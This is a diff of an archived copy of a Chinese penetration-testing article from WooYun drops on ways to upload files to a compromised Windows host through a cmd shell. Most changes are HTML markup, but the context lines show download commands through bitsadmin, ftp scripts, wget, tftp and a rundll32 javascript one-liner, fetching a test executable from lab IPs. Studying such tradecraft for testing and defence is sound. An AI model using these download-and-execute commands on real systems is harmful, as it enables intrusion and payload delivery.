@@ -3,18 +3,18 @@
 			<head>
 			     <title>渗透技巧——通过cmd上传文件的N种方法 - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/14101">http://drops.wooyun.org/tips/14101</a></h1>
 				
       <p>
-        <h1>0x00 前言</h1>
+        </p><h1>0x00 前言</h1>
 
-<hr />
+<hr>
 
 <p>在渗透测试的过程中，常常需要向目标主机上传文件，我在最近的学习测试过程中就碰到了这个问题，要求只能通过cmd shell向目标主机（Windows系统）上传文件，所以本文就对该技巧做一下总结。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009121759442130.jpg" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/2016033009121759442130.jpg" alt="Alt text"></p>
 
 <!--more-->
 
@@ -24,7 +24,7 @@
 
 <h1>0x02 测试环境</h1>
 
-<hr />
+<hr>
 
 <pre><code>OS：Win7 x86
 test exe：ssss2.exe,成功运行后输出1
@@ -32,7 +32,7 @@ test exe：ssss2.exe,成功运行后输出1
 
 <h1>0x03 通用上传方法</h1>
 
-<hr />
+<hr>
 
 <h3>1、 debug</h3>
 
@@ -48,7 +48,7 @@ test exe：ssss2.exe,成功运行后输出1
 
 <p>特别的是它还有一个功能可以将十六进制代码转换为可执行文件：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009121959579259.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/2016033009121959579259.png" alt="Alt text"></p>
 
 <p>结合本文的目标，思路如下：</p>
 
@@ -64,7 +64,7 @@ test exe：ssss2.exe,成功运行后输出1
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122047403348.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/2016033009122047403348.png" alt="Alt text"></p>
 
 <p><strong>操作步骤：</strong></p>
 
@@ -81,14 +81,14 @@ wine exe2bat.exe ssss2.exe ssss2.txt
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122225187425.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/2016033009122225187425.png" alt="Alt text"></p>
 
-<p><strong>注：</strong><br />
+<p><strong>注：</strong><br>
 exe2bat不支持大于64kb的文件 debug默认只支持在32位系统</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122314499520.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/2016033009122314499520.png" alt="Alt text"></p>
 
 <h3>2、ftp</h3>
 
@@ -113,9 +113,9 @@ ftp -s:ftp.txt
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122511491620.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/2016033009122511491620.png" alt="Alt text"></p>
 
-<p><strong>注：</strong><br />
+<p><strong>注：</strong><br>
 初次使用ftp下载防火墙会弹框拦截，使用前记得要先添加防火墙规则</p>
 
 <h3>3、vbs</h3>
@@ -197,9 +197,9 @@ t\update\download.exe C:\test\update\download.cs
 
 <p>如图成功生成download.exe</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122671756720.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/2016033009122671756720.png" alt="Alt text"></p>
 
-<p><strong>注：</strong><br />
+<p><strong>注：</strong><br>
 csc.exe的绝对路径要根据系统的.net版本来确定</p>
 
 <h3>6、JScript</h3>
@@ -235,9 +235,9 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();Object
 
 <p>执行后会提示没有权限，很有趣的地方，更多的细节会在以后的文章介绍</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122885417818.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/2016033009122885417818.png" alt="Alt text"></p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009123078521918.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/2016033009123078521918.png" alt="Alt text"></p>
 
 <h3>7、hta</h3>
 
@@ -285,10 +285,10 @@ bitsadmin /transfer n http://download.sysinternals.com/files/PSTools.zip  C:\tes
 
 <p>下载成功如图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330091232111021017.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/20160330091232111021017.png" alt="Alt text"></p>
 
-<p><strong>注：</strong><br />
-不支持https、ftp协议<br />
+<p><strong>注：</strong><br>
+不支持https、ftp协议<br>
 使用kali的simplehttpserver作服务器会报错</p>
 
 <h3>9、base64</h3>
@@ -341,7 +341,7 @@ namespace test1
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160407/2016040703495749038.png" alt="enter image description here" /></p>
+<p><img src="http://static.wooyun.org//drops/20160407/2016040703495749038.png" alt="enter image description here"></p>
 
 <p>解密base64文件并生成exe的方法：</p>
 
@@ -381,7 +381,7 @@ namespace test1
 
 <h1>0x04 补充上传方法</h1>
 
-<hr />
+<hr>
 
 <p>以上均为系统默认包含的程序，结合以上方法并借助于第三方工具也能够实现功能</p>
 
@@ -395,7 +395,7 @@ bitsadmin /transfer n http://www.interlog.com/~tcharron/wgetwin-1_5_3_1-binary.z
 
 <p>运行后会下载wget的压缩包wget.zip</p>
 
-<p><strong>注：</strong><br />
+<p><strong>注：</strong><br>
 Windows系统默认不包含解压缩zip文件的命令，但是可以通过vbs来实现解压缩zip文件</p>
 
 <p><strong>vbs实现解压缩：</strong></p>
@@ -434,7 +434,7 @@ C:\test\update\wget\wget.exe http://192.168.174.145/ssss2.exe
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330091233967151122.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/20160330091233967151122.png" alt="Alt text"></p>
 
 <h3>2、ftfp</h3>
 
@@ -450,24 +450,24 @@ bitsadmin /transfer n http://www.winagents.com/downloads/tftp.exe C:\test\update
 tftp -i 192.168.174.151 GET tftp\ssss2.exe C:\test\update\ssss2.exe
 </code></pre>
 
-<p><strong>注：</strong><br />
+<p><strong>注：</strong><br>
 默认防火墙会拦截</p>
 
 <p>关掉防火墙或者添加规则即可</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330091235612341219.png" alt="Alt text" /></p>
+<p><img src="http://static.wooyun.org//drops/20160330/20160330091235612341219.png" alt="Alt text"></p>
 
 <h1>0x05 小结</h1>
 
-<hr />
+<hr>
 
 <p>本文对一些常用的通过cmd来传输文件的技巧做了整理，侧重于介绍其中较为通用简便的方法，所以并未介绍其他需要配置开发环境的实现方法，如Python、Ruby、Php等，如果你有更好的实现方法，欢迎与我交流，共同学习。</p>
 
 <h1>0x06 参考资料</h1>
 
-<hr />
+<hr>
 
 <ul>
 <li><a href="http://ly0n.me/2015/10/21/uploading-files-to-compromised-systems/">http://ly0n.me/2015/10/21/uploading-files-to-compromised-systems/</a></li>
@@ -476,7 +476,7 @@ tftp -i 192.168.174.151 GET tftp\ssss2.exe C:\test\update\ssss2.exe
 <li><a href="http://demon.tw/programming/vbs-unzip-file.html">http://demon.tw/programming/vbs-unzip-file.html</a></li>
 </ul>
 
-<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p>      </p>
+<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p>      <p></p>
     
 			</body>
 		</html>
